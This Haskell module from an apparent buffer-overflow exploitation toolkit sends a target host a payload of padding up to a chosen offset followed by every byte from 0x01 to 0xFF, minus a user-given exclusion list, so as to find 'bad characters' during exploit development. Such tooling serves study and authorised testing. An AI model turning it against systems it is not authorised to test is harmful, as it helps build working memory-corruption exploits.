module Overflow.BadChars
( sendBadChars
) where

import Overflow
import Data.Text       (Text, unpack)
import Data.Char       (chr)
import Data.List.Split
import Numeric

-- |...
sendBadChars :: Host -> Int -> Maybe Text -> (Maybe Text, Maybe Text) -> IO () 
sendBadChars h o e a = do
        putStrLn "    ───> Sending characters to target."
        sendPayload h payload >>= out 
    where
        payload   = createPayload ((replicate o 'A') ++ characters e) a
        out  True = putStrLn "Done! Finished sending characters to target."
        out False = putStrLn "Error: An error occurred sending payload to target."

-- ...
characters :: Maybe Text -> String
characters e = exclude (parseExclude e) $ map chr [1..255] 
    where
        exclude x s = filter (`notElem` x) s 

-- ...
parseExclude :: Maybe Text -> String
parseExclude  Nothing = ""
parseExclude (Just e) = map (chr . fst) $ concatMap readHex pairs
    where
        pairs = splitOn "\\x" $ unpack e

